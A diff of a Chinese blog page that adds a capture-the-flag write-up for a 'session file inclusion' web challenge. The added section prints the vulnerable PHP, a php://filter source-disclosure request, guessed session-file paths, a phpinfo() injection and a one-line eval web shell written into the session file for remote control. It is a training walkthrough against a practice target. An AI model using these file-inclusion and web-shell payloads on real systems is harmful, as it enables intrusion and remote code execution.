@@ -107,6 +107,18 @@
 <meta property="og:image" content="http://linguo-ok.github.io/2026/01/01/polar-web-easy-1/17-3.png">
 <meta property="og:image" content="http://linguo-ok.github.io/2026/01/01/polar-web-easy-1/17-4.png">
 <meta property="og:image" content="http://linguo-ok.github.io/2026/01/01/polar-web-easy-1/17-5.png">
+<meta property="og:image" content="http://linguo-ok.github.io/2026/01/01/polar-web-easy-1/18-1.png">
+<meta property="og:image" content="http://linguo-ok.github.io/2026/01/01/polar-web-easy-1/18-2.png">
+<meta property="og:image" content="http://linguo-ok.github.io/2026/01/01/polar-web-easy-1/18-3.png">
+<meta property="og:image" content="http://linguo-ok.github.io/2026/01/01/polar-web-easy-1/18-4.png">
+<meta property="og:image" content="http://linguo-ok.github.io/2026/01/01/polar-web-easy-1/18-5.png">
+<meta property="og:image" content="http://linguo-ok.github.io/2026/01/01/polar-web-easy-1/18-6.png">
+<meta property="og:image" content="http://linguo-ok.github.io/2026/01/01/polar-web-easy-1/18-7.png">
+<meta property="og:image" content="http://linguo-ok.github.io/2026/01/01/polar-web-easy-1/18-8.png">
+<meta property="og:image" content="http://linguo-ok.github.io/2026/01/01/polar-web-easy-1/18-9.png">
+<meta property="og:image" content="http://linguo-ok.github.io/2026/01/01/polar-web-easy-1/18-10.png">
+<meta property="og:image" content="http://linguo-ok.github.io/2026/01/01/polar-web-easy-1/18-11.png">
+<meta property="og:image" content="http://linguo-ok.github.io/2026/01/01/polar-web-easy-1/18-12.png">
 <meta property="og:image" content="http://linguo-ok.github.io/2026/01/01/polar-web-easy-1/19-1.png">
 <meta property="og:image" content="http://linguo-ok.github.io/2026/01/01/polar-web-easy-1/19-2.png">
 <meta property="og:image" content="http://linguo-ok.github.io/2026/01/01/polar-web-easy-1/19-3.png">
@@ -134,7 +146,7 @@
 <meta property="og:image" content="http://linguo-ok.github.io/2026/01/01/polar-web-easy-1/24-8.png">
 <meta property="og:image" content="http://linguo-ok.github.io/2026/01/01/polar-web-easy-1/24-9.png">
 <meta property="article:published_time" content="2025-12-31T16:00:00.000Z">
-<meta property="article:modified_time" content="2026-01-03T07:35:49.431Z">
+<meta property="article:modified_time" content="2026-01-03T08:55:09.393Z">
 <meta property="article:author" content="linguo">
 <meta property="article:tag" content="polarD&amp;N">
 <meta name="twitter:card" content="summary_large_image">
@@ -331,7 +343,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          8.3k 字
+          8.9k 字
         
       </span>
     
@@ -342,7 +354,7 @@
         
         
         
-          70 分钟
+          75 分钟
         
       </span>
     
@@ -825,6 +837,47 @@
 <h1 id="session文件包含"><a href="#session文件包含" class="headerlink" title="session文件包含"></a>session文件包含</h1><blockquote>
 <p>考查点：session文件包含</p>
 </blockquote>
+<p>题目给出一个输入框，提示输入 <strong>name</strong></p>
+<p><img src="/2026/01/01/polar-web-easy-1/18-1.png" srcset="/img/loading.gif" lazyload></p>
+<p>那我们就随便输入一下，发现页面跳转，其中有两个选项</p>
+<p><img src="/2026/01/01/polar-web-easy-1/18-2.png" srcset="/img/loading.gif" lazyload></p>
+<p>查看 <strong>my dairy</strong> 结果如下，看样子是有限制（比如需要 admain 身份查看）</p>
+<p><img src="/2026/01/01/polar-web-easy-1/18-3.png" srcset="/img/loading.gif" lazyload></p>
+<p>查看 <strong>my boollist</strong> 结果如下，并没有发现异常之处</p>
+<p><img src="/2026/01/01/polar-web-easy-1/18-4.png" srcset="/img/loading.gif" lazyload></p>
+<p>此时，我们就需要考虑一下题目给我们的提示了：<strong>session文件包含</strong></p>
+<p>另外，当我们点击上面两个选项时，地址栏显示有参数 <strong>file</strong>，我们可以尝试用伪协议读取一下 <strong>action.php</strong>，看看会不会有源码</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">?file=php://filter/convert.base64-encode/resource=action.php<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2026/01/01/polar-web-easy-1/18-5.png" srcset="/img/loading.gif" lazyload></p>
+<p>解密得到源码，对比查看网页源码看到的内容，此处多了一段php代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br>session_start();<br>error_reporting(0);<br>$name = $_POST[&#x27;name&#x27;];<br>if($name)&#123;<br>	$_SESSION[&quot;username&quot;] = $name;<br>&#125;<br>include($_GET[&#x27;file&#x27;]);<br>?&gt;<br>&lt;!DOCTYPE html&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;a href=action.php?file=1.txt&gt;my dairy&lt;/a&gt;<br>&lt;a href=action.php?file=2.txt&gt;my booklist&lt;/a&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>session 变量用于存储关于用户会话（session）的信息，或者更改用户会话（session）的设置</p>
+<p>session 变量存储单一用户的信息，并且对于应用程序中的所有页面都是可用的，但是两个访问者之间不能共享该信息</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">session_start</span>(); <span class="hljs-comment">//开启Session功能</span><br><span class="hljs-title function_ invoke__">session_id</span>();<span class="hljs-comment">//获取用户Session ID值，如需修改在括号中传值即可</span><br><br>利用session变量存储信息：<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;Session名称&quot;</span>]=变量或字符串信息;<br><br>读取session变量信息（可赋值给一个变量或者直接输出）：<br>变量=<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;Session名称&quot;</span>];<br></code></pre></td></tr></table></figure>
+
+<p>默认存储路径：PHP 默认将 session 文件存储在 <code>/var/lib/php/sessions</code> 或 <code>/tmp</code> 目录下，文件名格式为 <code>sess_&lt;SessionID&gt;</code>，<strong>sessionid</strong> 在cookie中可以查看（<strong>PHPSESSID</strong>）</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">/<span class="hljs-keyword">var</span>/lib/php/sess_PHPSESSID<br>/<span class="hljs-keyword">var</span>/lib/php/sessions/sess_PHPSESSID<br>/tmp/sess_PHPSESSID<br>/tmp/sessions/sess_PHPSESSID<br></code></pre></td></tr></table></figure>
+</blockquote>
+<p>现在我们有了参数 <strong>name</strong>，需要猜测存放 session 文件的位置，一般默认为 <strong>tmp</strong></p>
+<p>首先我们看看 cookie 中的 <strong>sessionid</strong>：<code>jd19054dgc90efsifoaojndpv5</code></p>
+<p><img src="/2026/01/01/polar-web-easy-1/18-6.png" srcset="/img/loading.gif" lazyload></p>
+<p>这样我们就可以猜测路径（此题为 <code>/tmp/sess_PHPSESSID</code>）：<code>/tmp/sess_jd19054dgc90efsifoaojndpv5</code>，尝试一下，读取该文件，回显成功</p>
+<p><img src="/2026/01/01/polar-web-easy-1/18-7.png" srcset="/img/loading.gif" lazyload></p>
+<p>尝试写入 <code>&lt;?php phpinfo(); ?&gt;</code>，执行成功</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-attribute">GET</span>:<br>	/action.php?file=/tmp/sess_jd19054dgc90efsifoaojndpv5<br><span class="hljs-attribute">POST</span>:<br>	name=&lt;?php phpinfo(); ?&gt;<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2026/01/01/polar-web-easy-1/18-8.png" srcset="/img/loading.gif" lazyload></p>
+<p>既然这样，那么我们就可以传入一句话木马，进行远程连接了</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-attribute">GET</span>:<br>	/action.php?file=/tmp/sess_jd19054dgc90efsifoaojndpv5<br><span class="hljs-attribute">POST</span>:<br>	&lt;?php @eval($_POST[&#x27;ha&#x27;]); ?&gt;<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2026/01/01/polar-web-easy-1/18-9.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2026/01/01/polar-web-easy-1/18-10.png" srcset="/img/loading.gif" lazyload></p>
+<p>如果不用蚁剑，我们也可以直接通过 <strong>name</strong> 参数进行命令执行读取 flag</p>
+<p><img src="/2026/01/01/polar-web-easy-1/18-11.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2026/01/01/polar-web-easy-1/18-12.png" srcset="/img/loading.gif" lazyload></p>
 <h1 id="Don’t-touch-me"><a href="#Don’t-touch-me" class="headerlink" title="Don’t touch me"></a>Don’t touch me</h1><blockquote>
 <p>考查点：网页源码注释信息泄露、前端元素修改</p>
 </blockquote>
